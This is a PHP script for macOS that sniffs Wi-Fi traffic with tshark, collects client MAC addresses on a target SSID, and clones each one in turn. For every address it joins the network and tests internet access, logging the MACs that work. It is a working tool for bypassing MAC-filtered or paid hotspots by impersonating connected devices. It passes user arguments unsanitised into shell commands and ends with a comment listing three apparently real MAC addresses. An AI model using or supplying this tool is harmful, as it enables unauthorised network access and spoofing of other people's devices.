<?php
if(shell_exec("whoami") != "root\n") {
	
	echo("|================================================================================|\n");
	echo("|          Please run this script as ROOT!                                       |\n");
	echo("|================================================================================|\n\n");
	
	exit;	
}
$tsharkcheck = shell_exec("type tshark");

if(strpos($tsharkcheck,'tshark is') === false) {
	
	echo("|================================================================================|\n");
	echo("|      Please install www.wireshark.org, this script heavily depend on it.       |\n");
	echo("|                  [https://www.wireshark.org/#download]                         |\n");
	echo("|================================================================================|\n\n");
	
	exit;
	
}
$macaddr_vendors = json_decode(file_get_contents("macaddr.json"),TRUE);

function txt_mac($mac)
{
        $myFile = "mac.txt";
        $fh = fopen($myFile, 'a');
        fwrite($fh, $mac." - Conected \n");
        fclose($fh);
}


function is_connected($mac)
{
    $connected = @fsockopen("www.google.com", 80); 
                                        //website, port  (try 80 or 443)
    if ($connected){
        $is_conn = "\e[1;37;42mConected ✔\e[0m"; //action when connected
        txt_mac($mac);
        fclose($connected);
    }else{
        $is_conn = "\e[1;37;41mDisconect ✘\e[0m"; //action in connection failure
    }
    return $is_conn;

}

$a_arg = $argv;
$param = array();
if (count($a_arg) == 1) {
    echo("\n Argument Lost \n");
    exit;
}
foreach ($a_arg as $key => $arg){
        if ($key > 0){
            list($x,$y) = explode('=', $arg);
            $param["$x"]    = $y;  
           }
       }
#var_dump($param);
#echo $param[aaa];
echo("|===============================CAPTURING PACK===================================|\n");
exec("tshark -a duration:$param[time] -I -i $param[interface] -w capture-output.pcap");

echo("\n|==============================READ PACK FOR MACs================================|");
exec("tshark -n -r capture-output.pcap 'wlan.ssid == $param[ssid] and wlan.ra[0:2] != ff:ff and wlan.ra[4:2] != ff:ff' | grep -Eo '→ [0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}' | perl -pe 's/→ //g' | sort ",$avl_mac);
$avl_mac = array_count_values($avl_mac);
arsort($avl_mac);
#print_r (array_keys($avl_mac));
#print_r ($avl_mac);
#exit;

$i = 1;
echo("\n|#======MAC============#PACK=====================BRAND===========================|\n");  
if(count($avl_mac) > 0) {
	
foreach ($avl_mac as $mac_for => $count) {
echo (" ".$i." | ".$mac_for." [".$count."] ".$macaddr_vendors[strtoupper(str_replace(":","",substr($mac_for,0,8)))]."\n");

$i++;
}

}else{
        echo("No MACs Try Again \n");
        exit;
    }

#$han = array_keys($avl_mac);
#echo $han[2-1];
echo("\n|===========================CLONING AND TEST INTERNET============================|\n");  
$i = 1;
foreach ($avl_mac as $mac_for => $count) {
sleep(4);
echo($i." | ");
sleep(1);
echo("[".$mac_for."] ");
sleep(1);
exec("sudo airport -z");
sleep(1);
exec("sudo ifconfig $param[interface] ether ".$mac_for);
$now_mac_addr = str_replace("\n","",shell_exec("ifconfig $param[interface] ether | grep -Eo '[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}'"));
sleep(1);
if ($now_mac_addr == $mac_for)
{
    echo("\e[1;37;42mCloning ✔\e[0m ");
}else{
        echo("\e[1;37;41mNot Cloning - Error ✘\e[0m ");
        echo $now_mac_addr;
    exit;
    }
exec("networksetup -setairportnetwork $param[interface] $param[ssid]",$output2);
if(!strpos($output2[0],'Could not')) {
echo("\e[1;37;42mSSID ✔\e[0m ");
}else {echo("\e[1;37;41mSSID - Error ✘\e[0m ");}
sleep(1);
echo("IP: ");
while ($yiaddr == "") {
#echo(".");
$yiaddr = str_replace("\n","",shell_exec("ipconfig getpacket $param[interface] | grep 'yiaddr = ' | grep -Eo '[0-9.]{1,100}'"));
flush();	    
sleep(2);		    
	    }
echo ("\e[1;37;42m".$yiaddr."\e[0m ");
sleep(1);
$is_conn = is_connected($mac_for);
echo(" ".$is_conn."\n");
$i++;
sleep(1);
}
echo("|=====================================FINISH=====================================|\n");



exit;
?>
#68:ef:43:c2:cb:84 8c:f5:a3:99:e9:82 98:fe:94:5c:d1:ff